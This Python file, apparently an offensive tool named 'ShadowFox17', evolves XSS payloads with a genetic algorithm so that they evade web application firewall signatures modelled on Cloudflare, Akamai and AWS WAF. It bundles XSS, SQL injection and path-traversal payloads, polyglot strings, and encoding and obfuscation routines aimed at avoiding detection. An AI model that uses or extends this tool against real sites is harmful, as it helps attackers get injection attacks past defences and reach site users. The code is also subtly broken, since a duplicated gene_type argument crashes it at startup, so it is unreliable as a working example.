#!/usr/bin/env python3
"""
ShadowFox17 - Genetic WAF Bypass Engine
Skriveni mehanizam koji koristi genetske algoritme za adaptaciju WAF bypass-a
Evolucija payload-a kroz selekciju, crossover i mutaciju
"""

import random
import re
import time
import json
import base64
import urllib.parse
from typing import List, Dict, Tuple, Any, Optional
from dataclasses import dataclass, field
from collections import defaultdict
import hashlib
import string
import itertools

@dataclass
class PayloadGene:
    """Genetska jedinica payload-a"""
    gene_type: str  # 'encoding', 'obfuscation', 'evasion', 'syntax'
    sequence: str   # Actual payload part
    fitness: float = 0.0
    generation: int = 0
    success_rate: float = 0.0
    bypass_history: List[str] = field(default_factory=list)

@dataclass
class PayloadChromosome:
    """Kompletni payload kao hromosom"""
    genes: List[PayloadGene]
    raw_payload: str
    fitness_score: float = 0.0
    generation: int = 0
    parent_ids: List[str] = field(default_factory=list)
    mutation_count: int = 0
    waf_signatures_bypassed: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        self.chromosome_id = hashlib.sha256(self.raw_payload.encode()).hexdigest()[:12]

class GeneticWAFBypass:
    """
    Napredni sistem koji koristi genetske algoritme za evoluciju WAF bypass payload-a
    Simulira prirodnu selekciju gde najuspešniji payload-i "preživljavaju" i "razmnožavaju se"
    """
    
    def __init__(self, population_size: int = 50, mutation_rate: float = 0.3, 
                 crossover_rate: float = 0.7, elite_percentage: float = 0.1):
        
        # Genetski parametri
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.elite_count = int(population_size * elite_percentage)
        
        # Populacija hromosoma
        self.population: List[PayloadChromosome] = []
        self.generation = 0
        self.fitness_history: List[float] = []
        
        # WAF signature baza (simulacija)
        self.waf_signatures = self._load_waf_signatures()
        self.bypass_patterns = self._initialize_bypass_patterns()
        
        # Encoding strategije
        self.encoding_strategies = {
            'url_encode': self._url_encode,
            'double_url_encode': self._double_url_encode,
            'html_encode': self._html_encode,
            'unicode_encode': self._unicode_encode,
            'base64_fragments': self._base64_fragments,
            'hex_encode': self._hex_encode,
            'char_code': self._char_code_encode,
            'mixed_case': self._mixed_case,
        }
        
        # Obfuscation tehnike
        self.obfuscation_techniques = {
            'comment_injection': self._comment_injection,
            'whitespace_manipulation': self._whitespace_manipulation,
            'concatenation': self._concatenation_obfuscation,
            'function_aliasing': self._function_aliasing,
            'property_access': self._property_access_obfuscation,
            'eval_construction': self._eval_construction,
            'string_splitting': self._string_splitting,
            'template_literals': self._template_literals,
        }
        
        # Evasion strategije
        self.evasion_strategies = {
            'syntax_variation': self._syntax_variation,
            'protocol_smuggling': self._protocol_smuggling,
            'parameter_pollution': self._parameter_pollution,
            'boundary_crossing': self._boundary_crossing,
            'context_switching': self._context_switching,
            'polyglot_construction': self._polyglot_construction,
        }
        
        # WAF detection patterns
        self.waf_detection_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'eval\s*\(',
            r'document\.',
            r'window\.',
            r'alert\s*\(',
            r'prompt\s*\(',
            r'confirm\s*\(',
            r'<img[^>]*onerror',
            r'<svg[^>]*onload',
            r'union.*select',
            r'drop\s+table',
            r'insert\s+into',
            r'delete\s+from',
        ]
    
    def _load_waf_signatures(self) -> Dict[str, List[str]]:
        """Simulacija WAF signature baze"""
        return {
            'cloudflare': [
                r'<script.*?>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'document\.\w+',
                r'window\.\w+',
            ],
            'akamai': [
                r'eval\s*\(',
                r'alert\s*\(',
                r'prompt\s*\(',
                r'<img.*?onerror',
                r'<svg.*?onload',
            ],
            'aws_waf': [
                r'union.*?select',
                r'drop\s+table',
                r'insert\s+into',
                r'<script[^>]*>',
                r'javascript:[^"\']*',
            ],
            'generic': [
                r'<.*?on\w+.*?=',
                r'javascript:.*?',
                r'<script.*?>',
                r'eval\(',
                r'expression\(',
            ]
        }
    
    def _initialize_bypass_patterns(self) -> Dict[str, List[str]]:
        """Inicijalizuje poznate bypass pattern-e"""
        return {
            'xss_vectors': [
                '<script>alert(1)</script>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
            ],
            'sqli_vectors': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND 1=1--",
                "' OR SLEEP(5)--",
                "' UNION ALL SELECT @@version--",
            ],
            'lfi_vectors': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'php://filter/read=convert.base64-encode/resource=index.php',
            ]
        }
    
    def create_initial_population(self, base_payloads: List[str]) -> None:
        """Kreira početnu populaciju hromosoma"""
        self.population = []
        
        for i in range(self.population_size):
            if i < len(base_payloads):
                # Koristi base payload
                payload = base_payloads[i]
            else:
                # Generiši random varijaciju postojećeg
                payload = random.choice(base_payloads)
                payload = self._random_mutation(payload)
            
            # Kreiraj gene
            genes = self._payload_to_genes(payload)
            chromosome = PayloadChromosome(
                genes=genes,
                raw_payload=payload,
                generation=self.generation
            )
            
            self.population.append(chromosome)
    
    def _payload_to_genes(self, payload: str) -> List[PayloadGene]:
        """Konvertuje payload u gene"""
        genes = []
        
        # Analiziraj payload i izdvoj komponente
        if '<script' in payload.lower():
            genes.append(PayloadGene('syntax', '<script>', gene_type='syntax'))
        if 'alert(' in payload:
            genes.append(PayloadGene('function', 'alert(', gene_type='function'))
        if 'onerror' in payload.lower():
            genes.append(PayloadGene('event', 'onerror', gene_type='event'))
        
        # Dodaj encoding gene ako postoje
        if '%' in payload:
            genes.append(PayloadGene('encoding', 'url_encode', gene_type='encoding'))
        if '&#' in payload:
            genes.append(PayloadGene('encoding', 'html_encode', gene_type='encoding'))
        
        return genes
    
    def evaluate_fitness(self, chromosome: PayloadChromosome, waf_response: str = None, 
                        execution_success: bool = False) -> float:
        """
        Evaluira fitness hromosoma na osnovu:
        1. WAF bypass (da li prolazi kroz WAF)
        2. Execution success (da li se izvršava)
        3. Stealth score (koliko je nezapažljiv)
        """
        fitness = 0.0
        
        # 1. WAF Bypass Score (0-40 poena)
        waf_bypass_score = self._calculate_waf_bypass_score(chromosome.raw_payload)
        fitness += waf_bypass_score
        
        # 2. Execution Success (0-30 poena)
        if execution_success:
            fitness += 30
        elif self._simulate_execution_probability(chromosome.raw_payload) > 0.7:
            fitness += 20  # Verovatno radi
        
        # 3. Stealth Score (0-20 poena)
        stealth_score = self._calculate_stealth_score(chromosome.raw_payload)
        fitness += stealth_score
        
        # 4. Novelty Bonus (0-10 poena)
        novelty_score = self._calculate_novelty_score(chromosome)
        fitness += novelty_score
        
        chromosome.fitness_score = fitness
        return fitness
    
    def _calculate_waf_bypass_score(self, payload: str) -> float:
        """Simulira WAF testing i vraća bypass score"""
        score = 40.0  # Maksimalni score
        
        # Testiraj protiv različitih WAF signature-a
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if re.search(signature, payload, re.IGNORECASE):
                    score -= 5  # Penalizuj za svaki match
        
        return max(0, score)
    
    def _simulate_execution_probability(self, payload: str) -> float:
        """Simulira verovatnoću da će se payload izvršiti"""
        # Jednostavna heuristika
        if '<script>' in payload and 'alert(' in payload:
            return 0.9
        elif 'onerror=' in payload or 'onload=' in payload:
            return 0.8
        elif 'javascript:' in payload:
            return 0.7
        return 0.3
    
    def _calculate_stealth_score(self, payload: str) -> float:
        """Računaj stealth score na osnovu obfuscation-a"""
        stealth = 20.0
        
        # Penalizuj očigledne pattern-e
        obvious_patterns = ['alert(1)', '<script>', 'javascript:', 'onerror=']
        for pattern in obvious_patterns:
            if pattern in payload.lower():
                stealth -= 3
        
        # Bonusi za obfuscation
        if any(c in payload for c in ['%', '&#', '\\u']):
            stealth += 2  # Encoding bonus
        if len(payload) > 50:
            stealth += 1  # Complexity bonus
        
        return max(0, stealth)
    
    def _calculate_novelty_score(self, chromosome: PayloadChromosome) -> float:
        """Bonusi za nove/inovativne pristupe"""
        novelty = 0.0
        
        # Bonus za nove kombinacije gene-a
        gene_combination = ''.join([g.gene_type for g in chromosome.genes])
        if gene_combination not in [c.genes for c in self.population[:10]]:
            novelty += 5
        
        # Bonus za bypassing više WAF-ova
        if len(chromosome.waf_signatures_bypassed) > 2:
            novelty += 3
        
        return novelty
    
    def selection(self) -> List[PayloadChromosome]:
        """Tournament selekcija najboljih hromosoma"""
        selected = []
        
        # Elitizam - zadržaj najbolje
        sorted_population = sorted(self.population, key=lambda x: x.fitness_score, reverse=True)
        selected.extend(sorted_population[:self.elite_count])
        
        # Tournament selekcija za ostale
        while len(selected) < self.population_size:
            tournament_size = 3
            tournament = random.sample(self.population, tournament_size)
            winner = max(tournament, key=lambda x: x.fitness_score)
            selected.append(winner)
        
        return selected
    
    def crossover(self, parent1: PayloadChromosome, parent2: PayloadChromosome) -> Tuple[PayloadChromosome, PayloadChromosome]:
        """Generiše potomke crossover-om dva roditelja"""
        if random.random() > self.crossover_rate:
            return parent1, parent2
        
        # Gene crossover
        child1_genes = []
        child2_genes = []
        
        max_genes = max(len(parent1.genes), len(parent2.genes))
        
        for i in range(max_genes):
            if i < len(parent1.genes) and i < len(parent2.genes):
                if random.random() < 0.5:
                    child1_genes.append(parent1.genes[i])
                    child2_genes.append(parent2.genes[i])
                else:
                    child1_genes.append(parent2.genes[i])
                    child2_genes.append(parent1.genes[i])
            elif i < len(parent1.genes):
                child1_genes.append(parent1.genes[i])
            elif i < len(parent2.genes):
                child2_genes.append(parent2.genes[i])
        
        # Kreiraj payload iz gene-a
        child1_payload = self._genes_to_payload(child1_genes)
        child2_payload = self._genes_to_payload(child2_genes)
        
        child1 = PayloadChromosome(
            genes=child1_genes,
            raw_payload=child1_payload,
            generation=self.generation + 1,
            parent_ids=[parent1.chromosome_id, parent2.chromosome_id]
        )
        
        child2 = PayloadChromosome(
            genes=child2_genes,
            raw_payload=child2_payload,
            generation=self.generation + 1,
            parent_ids=[parent1.chromosome_id, parent2.chromosome_id]
        )
        
        return child1, child2
    
    def mutate(self, chromosome: PayloadChromosome) -> PayloadChromosome:
        """Mutira hromosom različitim strategijama"""
        if random.random() > self.mutation_rate:
            return chromosome
        
        mutated_payload = chromosome.raw_payload
        mutation_applied = False
        
        # Različite mutacione strategije
        mutation_strategies = [
            self._encoding_mutation,
            self._obfuscation_mutation,
            self._evasion_mutation,
            self._syntax_mutation,
            self._polyglot_mutation,
        ]
        
        # Primeni random strategiju
        strategy = random.choice(mutation_strategies)
        mutated_payload = strategy(mutated_payload)
        
        if mutated_payload != chromosome.raw_payload:
            mutation_applied = True
            chromosome.mutation_count += 1
        
        # Ažuriraj gene
        new_genes = self._payload_to_genes(mutated_payload)
        
        mutated_chromosome = PayloadChromosome(
            genes=new_genes,
            raw_payload=mutated_payload,
            generation=self.generation + 1,
            parent_ids=[chromosome.chromosome_id],
            mutation_count=chromosome.mutation_count
        )
        
        return mutated_chromosome
    
    def _encoding_mutation(self, payload: str) -> str:
        """Mutacija kroz encoding strategije"""
        strategy = random.choice(list(self.encoding_strategies.keys()))
        return self.encoding_strategies[strategy](payload)
    
    def _obfuscation_mutation(self, payload: str) -> str:
        """Mutacija kroz obfuscation tehnike"""
        technique = random.choice(list(self.obfuscation_techniques.keys()))
        return self.obfuscation_techniques[technique](payload)
    
    def _evasion_mutation(self, payload: str) -> str:
        """Mutacija kroz evasion strategije"""
        strategy = random.choice(list(self.evasion_strategies.keys()))
        return self.evasion_strategies[strategy](payload)
    
    def _syntax_mutation(self, payload: str) -> str:
        """Mutacija sintakse"""
        mutations = [
            lambda p: p.replace('<script>', '<script type="text/javascript">'),
            lambda p: p.replace('alert(', 'window.alert('),
            lambda p: p.replace('=', ' = '),
            lambda p: p.replace('>', ' >'),
            lambda p: p.replace('<', '< '),
        ]
        
        mutation = random.choice(mutations)
        return mutation(payload)
    
    def _polyglot_mutation(self, payload: str) -> str:
        """Kreira polyglot payload koji radi u više konteksta"""
        polyglot_templates = [
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+(s=document.createElement(/script/),s.stack=Error().stack,s.src=(/,/+/{}/.source+/{}.constructor.constructor/.source)[(/,/+{}).split(/,/[1]).slice(-1),document.documentElement.appendChild(s))//\n',
            '"><img src=x onerror=alert(1)>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//</script><script>alert(String.fromCharCode(88,83,83))</script>',
        ]
        
        return random.choice(polyglot_templates)
    
    # === ENCODING STRATEGIJE ===
    
    def _url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload, safe='')
    
    def _double_url_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def _html_encode(self, payload: str) -> str:
        return ''.join([f'&#{ord(c)};' if ord(c) > 127 or c in '<>"\'&' else c for c in payload])
    
    def _unicode_encode(self, payload: str) -> str:
        return ''.join([f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload])
    
    def _base64_fragments(self, payload: str) -> str:
        # Fragmentiraj i base64 enkoduj delove
        fragments = [payload[i:i+4] for i in range(0, len(payload), 4)]
        encoded_fragments = [base64.b64encode(f.encode()).decode() for f in fragments]
        return '+'.join([f'atob("{f}")' for f in encoded_fragments])
    
    def _hex_encode(self, payload: str) -> str:
        return ''.join([f'\\x{ord(c):02x}' for c in payload])
    
    def _char_code_encode(self, payload: str) -> str:
        char_codes = [str(ord(c)) for c in payload]
        return f'String.fromCharCode({",".join(char_codes)})'
    
    def _mixed_case(self, payload: str) -> str:
        return ''.join([c.upper() if random.random() < 0.5 else c.lower() for c in payload])
    
    # === OBFUSCATION TEHNIKE ===
    
    def _comment_injection(self, payload: str) -> str:
        comments = ['/**/', '/**//*', '//\n', '<!--', '-->', '/*\n*/']
        comment = random.choice(comments)
        pos = random.randint(0, len(payload))
        return payload[:pos] + comment + payload[pos:]
    
    def _whitespace_manipulation(self, payload: str) -> str:
        # Dodaj random whitespace
        ws_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        ws = random.choice(ws_chars)
        pos = random.randint(0, len(payload))
        return payload[:pos] + ws + payload[pos:]
    
    def _concatenation_obfuscation(self, payload: str) -> str:
        if 'alert' in payload:
            return payload.replace('alert', '"ale"+"rt"')
        elif 'script' in payload:
            return payload.replace('script', '"scr"+"ipt"')
        return payload
    
    def _function_aliasing(self, payload: str) -> str:
        if 'alert(' in payload:
            return 'var a=alert;' + payload.replace('alert(', 'a(')
        return payload
    
    def _property_access_obfuscation(self, payload: str) -> str:
        if 'document.' in payload:
            return payload.replace('document.', 'window["document"].')
        return payload
    
    def _eval_construction(self, payload: str) -> str:
        if '<script>' in payload:
            js_part = payload.replace('<script>', '').replace('</script>', '')
            return f'<script>eval("{js_part}")</script>'
        return payload
    
    def _string_splitting(self, payload: str) -> str:
        if len(payload) > 10:
            mid = len(payload) // 2
            return f'("{payload[:mid]}")+("{payload[mid:]}")'
        return payload
    
    def _template_literals(self, payload: str) -> str:
        if 'alert(' in payload:
            return payload.replace('alert(', '`${alert}(`')
        return payload
    
    # === EVASION STRATEGIJE ===
    
    def _syntax_variation(self, payload: str) -> str:
        variations = {
            '<script>': ['<script type="text/javascript">', '<script language="javascript">'],
            'onerror=': ['onerror =', 'onerror\t=', 'onerror\n='],
            'javascript:': ['javascript:', 'javascript://'],
        }
        
        for original, variants in variations.items():
            if original in payload:
                return payload.replace(original, random.choice(variants))
        
        return payload
    
    def _protocol_smuggling(self, payload: str) -> str:
        if 'javascript:' in payload:
            return payload.replace('javascript:', 'javascript://comment%0A')
        return payload
    
    def _parameter_pollution(self, payload: str) -> str:
        # Dodaj dummy parametre
        if '?' not in payload:
            return payload + '?dummy=1&real=value'
        return payload + '&dummy=1'
    
    def _boundary_crossing(self, payload: str) -> str:
        # Pokušaj da izađe iz trenutnog konteksta
        boundary_breaks = ['</title>', '</style>', '</textarea>', '</script>']
        break_seq = random.choice(boundary_breaks)
        return break_seq + payload
    
    def _context_switching(self, payload: str) -> str:
        # Kombinuj HTML i JavaScript kontekst
        if '<script>' not in payload:
            return f'<script>{payload}</script>'
        return payload
    
    def _polyglot_construction(self, payload: str) -> str:
        # Napravi payload koji radi u više konteksta
        polyglot_prefix = '";}'
        polyglot_suffix = '//\n'
        return polyglot_prefix + payload + polyglot_suffix
    
    def _genes_to_payload(self, genes: List[PayloadGene]) -> str:
        """Rekonstruiše payload iz gene-a"""
        # Jednostavna implementacija - u realnosti bi bila složenija
        payload_parts = [gene.sequence for gene in genes]
        return ''.join(payload_parts)
    
    def _random_mutation(self, payload: str) -> str:
        """Primeni random mutaciju"""
        mutations = list(self.encoding_strategies.values()) + \
                   list(self.obfuscation_techniques.values()) + \
                   list(self.evasion_strategies.values())
        
        mutation = random.choice(mutations)
        return mutation(payload)
    
    def evolve_generation(self) -> Dict[str, Any]:
        """Evolucija jedne generacije"""
        # 1. Evaluacija fitness-a
        for chromosome in self.population:
            if chromosome.fitness_score == 0:
                self.evaluate_fitness(chromosome)
        
        # 2. Selekcija
        selected = self.selection()
        
        # 3. Crossover i mutacija
        new_population = []
        
        # Zadrži elite
        new_population.extend(selected[:self.elite_count])
        
        # Generiši potomke
        while len(new_population) < self.population_size:
            parent1 = random.choice(selected)
            parent2 = random.choice(selected)
            
            child1, child2 = self.crossover(parent1, parent2)
            
            child1 = self.mutate(child1)
            child2 = self.mutate(child2)
            
            new_population.extend([child1, child2])
        
        # Ograniči na population_size
        self.population = new_population[:self.population_size]
        self.generation += 1
        
        # Statistike
        best_fitness = max([c.fitness_score for c in self.population])
        avg_fitness = sum([c.fitness_score for c in self.population]) / len(self.population)
        self.fitness_history.append(best_fitness)
        
        return {
            'generation': self.generation,
            'best_fitness': best_fitness,
            'avg_fitness': avg_fitness,
            'population_size': len(self.population),
            'best_payload': max(self.population, key=lambda x: x.fitness_score).raw_payload
        }
    
    def get_best_payloads(self, count: int = 5) -> List[PayloadChromosome]:
        """Dobija najbolje payload-e iz trenutne populacije"""
        sorted_population = sorted(self.population, key=lambda x: x.fitness_score, reverse=True)
        return sorted_population[:count]
    
    def adaptive_evolution(self, target_fitness: float = 80.0, max_generations: int = 100) -> List[PayloadChromosome]:
        """
        Adaptivna evolucija koja se prilagođava uspešnosti
        Menja parametre tokom evolucije na osnovu progresa
        """
        stagnation_counter = 0
        best_fitness_plateau = 0
        
        for gen in range(max_generations):
            stats = self.evolve_generation()
            
            # Proveri stagnaciju
            if stats['best_fitness'] <= best_fitness_plateau:
                stagnation_counter += 1
            else:
                stagnation_counter = 0
                best_fitness_plateau = stats['best_fitness']
            
            # Adaptivni parametri
            if stagnation_counter > 5:
                # Povećaj mutation rate za više diverziteta
                self.mutation_rate = min(0.8, self.mutation_rate * 1.2)
                stagnation_counter = 0
            
            if stats['best_fitness'] >= target_fitness:
                print(f"Target fitness {target_fitness} reached in generation {gen}")
                break
            
            # Periodični izveštaj
            if gen % 10 == 0:
                print(f"Generation {gen}: Best={stats['best_fitness']:.2f}, Avg={stats['avg_fitness']:.2f}")
        
        return self.get_best_payloads()

# === USAGE EXAMPLE ===
if __name__ == "__main__":
    # Inicijalizuj genetski sistem
    genetic_bypass = GeneticWAFBypass(population_size=30, mutation_rate=0.4)
    
    # Početni payload-i
    base_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
    ]
    
    # Kreiraj početnu populaciju
    genetic_bypass.create_initial_population(base_payloads)
    
    print("🧬 Pokretanje genetske evolucije WAF bypass payload-a...")
    print("=" * 60)
    
    # Pokreni adaptivnu evoluciju
    best_payloads = genetic_bypass.adaptive_evolution(target_fitness=75.0, max_generations=50)
    
    print("\n🏆 Najbolji evolucijsko optimizovani payload-i:")
    print("=" * 60)
    
    for i, payload in enumerate(best_payloads, 1):
        print(f"{i}. Fitness: {payload.fitness_score:.2f}")
        print(f"   Payload: {payload.raw_payload}")
        print(f"   Generation: {payload.generation}")
        print(f"   Mutations: {payload.mutation_count}")
        print(f"   WAF Bypassed: {len(payload.waf_signatures_bypassed)}")
        print("-" * 40)
